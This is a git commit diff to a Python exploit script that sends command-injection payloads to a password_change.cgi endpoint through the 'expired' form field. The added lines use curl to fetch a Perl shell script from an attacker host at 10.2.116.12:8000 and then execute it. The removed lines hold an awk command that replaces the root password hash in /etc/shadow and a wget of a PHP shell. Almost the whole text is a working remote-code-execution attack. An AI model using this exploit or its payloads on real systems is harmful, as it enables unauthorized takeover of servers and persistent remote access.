165f28acc69407acb421b5ef8555f5b22257c4d5
Tim <63605828+0xt1m@users.noreply.github.com>
2024-02-27 00:31:07 -0500

    Update my_exp.py

--- Source/my_exp.py
+++ Source/my_exp.py
@@ -7,15 +7,13 @@ url = "https://"+target+":"+port+"/password_change.cgi"
 rhost = "10.2.116.12"
 rport = 2222
 
-#command = f"wget http:{rhost}:8000/shell.php"
-# command = "curl -o perl_shell.pl http://10.2.116.12:8000/perl_shell.pl"
-
-root_value = "root:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.:18295:0:99999:7:::"
-something = "NR==1 {$0=" + root_value + "} 1"
-#command = "awk " + something + " /etc/shadow > tmpfile && mv tmpfile /etc/shadow"
-command = "perl perl_shell.pl"
+command1 = "curl -o perl_shell.pl http://10.2.116.12:8000/perl_shell.pl"
+command2 = "perl perl_shell.pl"
 
 header = f'Referer: https://{target}:{port}/session_login.cgi'
-payload = f'user=gotroot&pam=&expired=2|echo "";{command}'
 
+payload = f'user=gotroot&pam=&expired=2|echo "";{command1}'
+os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
+
+payload = f'user=gotroot&pam=&expired=2|echo "";{command2}'
 os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
